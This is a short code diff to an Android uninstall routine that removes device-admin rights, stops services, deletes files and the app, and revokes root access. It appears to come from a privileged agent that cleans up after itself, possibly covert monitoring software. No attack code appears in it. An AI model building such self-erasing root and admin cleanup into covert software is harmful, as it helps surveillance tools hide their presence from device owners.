@@ -73,6 +73,17 @@ public class UninstallAction extends SubActionSlow {
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
 
+		removeAdmin(status.getAppContext());
+
+		boolean ret = stopServices();
+		ret &= removeFiles();
+		ret &= deleteApplication();
+		ret &= removeRoot(status);
+
+		return ret;
+	}
+
+	private static boolean removeRoot(Status status) {
 		if (status.haveRoot() == true) {
 			Process localProcess;
 
@@ -85,18 +96,11 @@ public class UninstallAction extends SubActionSlow {
 				if (Cfg.EXP) {
 					Check.log(e);
 				}
+				return false;
 			}
 		}
 
-		// if (status.getDeviceAdmin()) {
-		removeAdmin(status.getAppContext());
-		// }
-
-		boolean ret = stopServices();
-		ret &= removeFiles();
-		ret &= deleteApplication();
-
-		return ret;
+		return true;
 	}
 
 	private static void removeAdmin(Context appContext) {
